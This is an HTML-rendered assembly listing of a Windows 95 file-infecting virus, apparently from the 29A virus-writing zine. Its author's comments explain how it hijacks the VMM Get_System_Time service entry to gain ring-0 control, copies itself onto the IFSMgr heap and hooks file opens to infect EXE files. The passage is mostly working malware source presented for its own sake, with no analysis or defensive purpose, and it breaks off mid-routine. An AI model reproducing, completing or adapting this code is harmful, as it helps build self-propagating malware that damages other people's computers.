<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Yoyo.653 - 29A_3.4_2.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Next Step by Quantum / VLAD</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Anyone who had read my Fuck Harry source will find this virus very</span><span class="sc0">
</span><span class="sc1">;similar. Just recently I became interested in writing a ring-0 win95 PE</span><span class="sc0">
</span><span class="sc1">;infector again.  On looking at my Fuck Harry virus I noticed a number of</span><span class="sc0">
</span><span class="sc1">;improvements that could be made.  This virus is the product.  Fuck Harry</span><span class="sc0">
</span><span class="sc1">;used zero space in the VMM device driver to store itself.  This virus</span><span class="sc0">
</span><span class="sc1">;could do that just as well but instead I have come up with a better</span><span class="sc0">
</span><span class="sc1">;method.  Using the heap alloc function of IFSMgr this virus is more</span><span class="sc0">
</span><span class="sc1">;stable.  It also includes a bit of code which I assume would allow this</span><span class="sc0">
</span><span class="sc1">;virus to return to host under winNT without giving errors.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;When I look at this virus and Fuck Harry I still can't beleive the</span><span class="sc0">
</span><span class="sc1">;mental alienation of Microsoft.  The idea that a ring-3 application</span><span class="sc0">
</span><span class="sc1">;running in a seperate virtual machine can write to ring-0 vxd space is</span><span class="sc0">
</span><span class="sc1">;beyond incompetense.  Not only is it possible to write to vxd space but</span><span class="sc0">
</span><span class="sc1">;you can set an entry in the VMM service table that gets called every</span><span class="sc0">
</span><span class="sc1">;second (Get_System_Time) to a handler that is in a ring-3 selector.</span><span class="sc0">
</span><span class="sc1">;That's what this virus does.  Once the handler gets control it allocates</span><span class="sc0">
</span><span class="sc1">;some space on the IFSMgr heap and copies the virus there.  It then calls</span><span class="sc0">
</span><span class="sc1">;the IFSMgr_InstallFileSystemApiHook routine to trap file opens.  So,</span><span class="sc0">
</span><span class="sc1">;needless to say, such terms as "Hacking ring-0" don't apply to windows</span><span class="sc0">
</span><span class="sc1">;95.  I sincerely hope that such things are not mirrored in windows NT.</span><span class="sc0">
</span><span class="sc1">;I don't have winNT (or desire to install it) so I can't check. If such</span><span class="sc0">
</span><span class="sc1">;things were possible one would suspect security concerns to be raised.</span><span class="sc0">
</span><span class="sc1">;The one thing I hate is the way dynamic linking is done.  It's a good</span><span class="sc0">
</span><span class="sc1">;idea I guess but it means you have to put the dynamic linking code back</span><span class="sc0">
</span><span class="sc1">;before you write the file - annoying.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I actually have tried to optimize this virus.  You could take out all</span><span class="sc0">
</span><span class="sc1">;the little checks, write to zero space in vmm again, etc and make this</span><span class="sc0">
</span><span class="sc1">;virus smaller but I honestly think sacrificing stability for size is a</span><span class="sc0">
</span><span class="sc1">;pointless exercise.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 642 bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Define the external functions we will be linking to</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">        </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">copyright</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Custom Host'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; dynamic linking</span><span class="sc0">
</span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; these are some includes I lifted from ifs.inc</span><span class="sc0">
</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc0">    </span><span class="sc1">; open file</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d600h</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d601h</span><span class="sc0">
</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d500h</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0d700h</span><span class="sc0">
</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D800h</span><span class="sc0">

</span><span class="sc5">startvirus</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; virus starts here</span><span class="sc0">
</span><span class="sc5">rstart</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; make sure cs is win95</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">137h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">weout</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">recalc1</span><span class="sc0">            </span><span class="sc1">; get delta offset</span><span class="sc0">
</span><span class="sc5">recalc1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">recalc1</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta1</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc1">; self modify second delta</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0c000e98ch</span><span class="sc0">       </span><span class="sc1">; make sure vmm in right place</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vmmstr</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmpsd</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">weout</span><span class="sc0">
    </span><span class="sc6">cmpsd</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">weout</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get the vmm service table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; get address of get_system_time</span><span class="sc0">

    </span><span class="sc1">; save the offset of vmm service table entry for get_system_time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">p_get_sys_time</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc1">; save the address of get_system_time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">org_get_sys_time</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">; set get_system_time in vmm service table to our routine</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">setuproutine</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc1">; wait until routine has set itself up</span><span class="sc0">
</span><span class="sc5">wait1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wtc</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">wait1</span><span class="sc0">

</span><span class="sc5">weout</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">; return to host</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">               </span><span class="sc1">; push orghost</span><span class="sc0">
</span><span class="sc5">orghost</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dummyhost</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">vmmstr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VMM     "</span><span class="sc0">             </span><span class="sc1">; this must be in the vmm ddb</span><span class="sc0">

</span><span class="sc1">; above is ring-3.  Below is ring-0.</span><span class="sc0">

    </span><span class="sc1">; this routine is called in place of get_system_time</span><span class="sc0">
</span><span class="sc5">setuproutine</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bdh</span><span class="sc0">                      </span><span class="sc1">; get the delta again</span><span class="sc0">
</span><span class="sc5">delta1</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startvirus</span><span class="sc0">

    </span><span class="sc1">; allocate some memory on the net stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">fix1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; were we successful ??</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">nomem</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; yes. address -&gt; edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">      </span><span class="sc1">; esi = startvirus</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; save address</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">        </span><span class="sc1">; copy the virus to net heap</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc1">; save the ring0 delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">r0delta1</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">apihook</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; FSAPI hook</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0">           </span><span class="sc1">; set the hook</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">nexthook</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save the old hook</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c000e980h</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">; mark residency</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">nomem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; set the vmm service table to the original value</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bfh</span><span class="sc0">         </span><span class="sc1">; mov edi,p_get_sys_time</span><span class="sc0">
</span><span class="sc5">p_get_sys_time</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">org_get_sys_time</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc1">; stop the host code waiting</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wtc</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">

    </span><span class="sc1">; go back to original get_system_time</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">         </span><span class="sc1">; push org_get_sys_time</span><span class="sc0">
</span><span class="sc5">org_get_sys_time</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">inuseflag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wtc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; this routine is called by IFSMgr whenever a file operation is performed</span><span class="sc0">
</span><span class="sc5">apihook</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bfh</span><span class="sc0">               </span><span class="sc1">; mov edi,r0delta1</span><span class="sc0">
</span><span class="sc5">r0delta1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">inuseflag</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; so we dont re-enter</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">okfile</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">     </span><span class="sc1">; is this an openfile call ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">okfile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">inuseflag</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">pusha</span><span class="sc0">

    </span><span class="sc1">; convert the name to ascii</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">namestore</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">uncname</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'@'</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">uncname</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">fix2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">UniToBCSPath</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;add the terminator-z</span><span class="sc0">

    </span><span class="sc1">; is it exe ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'OYOY'</span><span class="sc0">        </span><span class="sc1">; 7</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notexe</span><span class="sc0">              </span><span class="sc1">; 2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; 1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notexe</span><span class="sc0">

    </span><span class="sc1">; set the dynamic routines that get altered to calls back to ints</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20cdh</span><span class="sc0">                    </span><span class="sc1">;4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">40000dh</span><span class="sc0">                 </span><span class="sc1">;5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">fix1</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">fix1</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">fix2</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                      </span><span class="sc1">;2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">fix2</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">fix3</span><span class="sc4">-</span><span class="sc5">startvirus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">                      </span><span class="sc1">;2</span><span class="sc0">
